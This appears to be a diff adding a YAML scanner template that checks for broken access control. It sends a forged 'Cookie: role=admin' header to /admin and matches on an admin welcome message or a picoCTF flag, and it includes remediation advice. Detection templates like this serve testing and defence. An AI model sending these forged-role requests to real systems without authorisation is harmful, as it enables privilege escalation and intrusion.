@@ -1,0 +1,42 @@
+id: role-cookie-bypass
+
+info:
+  name: Client-Controlled Role Cookie Enables Admin Access
+  severity: Critical
+  confidence: high
+  category: Broken Access Control
+  description: The application grants privileged access based on a client-controlled cookie value, allowing attackers to forge an administrative role.
+  remediation: Store authorization state server-side, sign or encrypt session data, and never trust a client-supplied role cookie for access control.
+  references:
+    - "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+    - "https://cwe.mitre.org/data/definitions/565.html"
+  cwe: "565"
+  owasp: "A01:2021-Broken Access Control"
+  tags: [cookie, authz, broken-access-control, chain]
+  preconditions: []
+  evidence_type: http-exchange
+  exploitability: critical
+
+steps:
+  - id: seed_cookie
+    request:
+      method: GET
+      path: /login?user=guest
+    expect:
+      status: [200]
+    report: false
+
+  - id: forge_admin
+    request:
+      method: GET
+      path: /admin
+      headers:
+        Cookie: role=admin
+    expect:
+      status: [200, 403]
+    match:
+      status: 200
+      body_regex:
+        - '(?i)welcome admin'
+        - 'picoCTF\{[^}]+\}'
+      require_all_regex: false
